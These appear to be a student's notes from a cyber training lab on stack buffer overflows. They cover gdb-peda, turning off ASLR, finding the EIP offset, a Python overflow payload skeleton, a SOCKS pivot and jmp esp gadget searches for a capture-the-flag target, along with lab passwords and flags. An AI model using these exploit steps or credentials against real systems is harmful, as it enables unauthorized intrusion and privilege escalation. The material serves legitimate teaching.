## CCTC Security Day 6
- agenda

exploit research = AORopen
## Admin Data 

### CTFd info FOR UPDATED CTF
| Field | Value | 
|-|-|
| Stack # | 10 | 
| Username | JAMO-005-B |  
| Password | YdY8vrRGOsRfhy6 |
| lin.internet | 10.50.21.133 |
|Linux ops | 192.168.65.20, 10.50.25.64|
| Windos Ops | 192.168.65.10, 10.50.23.82|

https://sec.cybbh.io/public/security/latest/lessons/lesson-7-exploit_sg.html

## Day 6 Exploit Development

### Stack Operational Terms 

- **`Heap`** – memory that can be allocated and deallocated as needed.

- **`Stack`** – a contiguous section of memory used for passing arguments to other functions and general housekeeping.

- **`Registers`** – Storage elements as close as possible to the central processing unit (CPU). There are many uses and types of registers, but in simple terms, general purpose registers can be used for whatever function is desired, that is fetching the contents of something from memory and placing it in the register for some computation/comparison, or special purpose registers such as the Instruction Pointer (IP), or Stack Pointer (SP) which are discussed below.

- **`Instruction Pointer (IP)`** – (AKA Program Counter (PC) contains the address of next instruction to be executed. When the instruction is executed, it increments to the next instruction unless the instruction transfers control to another location by replacing the contents of the IP with the address of the next command to be executed through the process of jumping, calling, or returning.

- **`Stack Pointer (SP)`** – Contains the address of the next available space on the stack. The x86 architecture utilizes a top-down stack. When an item is saved on the stack (using a push command), it will be placed in the location addressed by the SP, after which, the SP will be decremented. When an item is fetched from the stack (using a pop instruction), the SP is decremented and then the item is retrieved from the address pointed to by the SP.

- **`Base Pointer (BP)`** – The base of the stack. Used to ensure that items placed on the stack can be referenced using an offset relative to the BP. Because each function is provided a portion of the stack, it can be used to ensure that the function does not address items outside the bounds of their area on the stack. When there is nothing on the stack the BP will equal SP.

- **`Function`** - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient. Functions can be written within the program or can exist outside of the main program through the processing of linking (accessing code outside the main program). When a function allocates space for variables, those variables are placed on the stack, so when the function completes and returns back to the calling function, access to those.

- **`Shellcode`** – The code that is executed once an exploit successfully takes advantage of a vulnerability. Shellcode often provides a shell to the actor, but it doesn’t have to. Whatever the intended effect is, is written in the shellcode.

- The terms **`IP, BP, SP, etc`** are used in this document. Register names are different depending on the x86 architecture. IP, BP, SP are used for 16 bit.
    - **The register names are prefixed with the letter E’ for extended which signifies 32 bit architecture. The letter R’ for register prefixes register names for a 64 bit architecture.**

***
### Binary Exploitation
**The main goal fo these exploits (heap and buffer overflow) is to redirect flow of execution. This can be to injected shell code or things that are already running in memory**

- Binary Defenses


***
[buffer overflow generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
### Exploit_dev.txt example (run aslr after every box reset to turn back on)
```
sudo apt install gcc gdb libc6-dev-i386 python gcc-multilib g++-multilib lib32z1 -y

sudo sysctl -w kernel.randomize_va_space=0

sudo sysctl -w kernel.yama.ptrace_scope=0
```

### tools used for buffer overflow

- Gdp-pedas
    - to run a file in it: `file *filename*`
    - to see assmbly and main functions: `pdisas main`
    - to see assembly for userinput functions: `pdisas getuserinput`, the red highlight is what to focus on
    - to see registers to see if you acctually overflowed: `r`
    gdb-peda$ r
```
Starting program: /home/student/func 
Enter a string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xffffd48e ('A' <repeats 150 times>)
EBX: 0x41414141 ('AAAA')
ECX: 0xf7fb75c0 --> 0xfbad2288 
EDX: 0xf7fb889c --> 0x0 
ESI: 0xf7fb7000 --> 0x1d4d8c 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd4d0 ('A' <repeats 84 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd4d0 ('A' <repeats 84 times>)
0004| 0xffffd4d4 ('A' <repeats 80 times>)
0008| 0xffffd4d8 ('A' <repeats 76 times>)
0012| 0xffffd4dc ('A' <repeats 72 times>)
0016| 0xffffd4e0 ('A' <repeats 68 times>)
0020| 0xffffd4e4 ('A' <repeats 64 times>)
0024| 0xffffd4e8 ('A' <repeats 60 times>)
0028| 0xffffd4ec ('A' <repeats 56 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
```
- Find offset 
    - now to find the offset for the buffer overflow, go to [buffer overflow generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and use a length that will overwrite (200) in this case.
    - copy the pattern, run the script in gbd again, then paste it
    - take the EIP Hex value (0x31634130 in this case), paste it into the register value on [buffer overflow generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to find the offset (62 in this case)

## Making our own buffer exploit script with shellcode
```
#!/usr/bin/env python

buffer="A"*62

eip="BBBB"

nop="\x90"*10

#shellcode

print(buffer+eip+nop)
```

### Clean way to open a file without peta or other config files
- `env - gdb *filename*`
- `info proc map`: shows where things are stored in memory: heaps, stacks, libraries, etc. **Should look between the heap and stack for most things in this class**


***
***
## CTF Challenges
Type of Operation: DEVOPS

Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.

Tools/Techniques: Exploit binaries on target systems using the tools below.

Python
OllyDBG or an equivelent graphical program
http://www.ollydbg.de/
GNU Debugger's(GDB) Python Exploit Development Assistance Module
https://github.com/longld/peda
MetaSploit
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
Scenario Credentials: FLAG = 3XPL01T5t@rt0F@ct1v1ty

Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.

Scheme of Maneuver:
>internet_grey_host
->T1: 192.168.28.111
->T2: 192.168.28.105
>internet_grey_host
->donovian_grey_host
-->T3: 192.168.150.245
Target Section:

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine
***
1. ELF Exploitation 1

**Situation**: Other teams have extracted this networked binary from a Donovian development network. It is believed to closely related to software running in both the Donovian and Gorgan internal networks. Discover vulnerabilities and create a reliable exploit to gain remote access. This will enable exploitation against Donovian targets and provide the basis for developing mitigations on friendly Gorgan networks. You will be required to exfil a copy from the target to your Op Station.

Provided: Executable Package: inventory.exe
Task: Perform a local buffer overflow on the vulnerable Linux executable, in order to gain access to the desired intel.
Method: Utilize RE toolset and python to launch and develop exploit.

ASLR is disabled on the target machine.

Exploit this binary found on 192.168.28.111 at /.hidden/inventory.exe to escalate privileges from your pivot user to root.

Enter the contents of /.secret/.verysecret.pdb as the flag

        - on lin-ops: ` ssh -D 9050 10.50.21.133 -NT`
        - in new window on lin-ops: `proxychains scp -P 2222 comrade@192.168.28.111:/.hidden/inventory.exe .`
        - open gdb, put a ton of A in to find out segfault 
        - then go to buffer overflow website to get a pattern 
        - run the file again in gdb, then put in that pattern. Look for the EIP hex, put that into registry to get an offset of **76**
        - modify exploit python file to match new offset
        -r <<< $(python exploit_CTF1.py)
        - proof of concept works
        - **open up new gdb with env off to have fresh slate**
        - r 
        - info proc map 
        - ` find /b 0xf7de2000, 0xf7ffe000, 0xff, 0xe4`
        - 0xf7de4b51
0xf7f5974b
0xf7f65753
0xf7f65c6b
0xf7f65df7
0xf7f6607b


        0xf7df1b51
0xf7f6674b
0xf7f72753
0xf7f72c6b
0xf7f72df7

9HGUx9PhojvbtGlZ5d2y
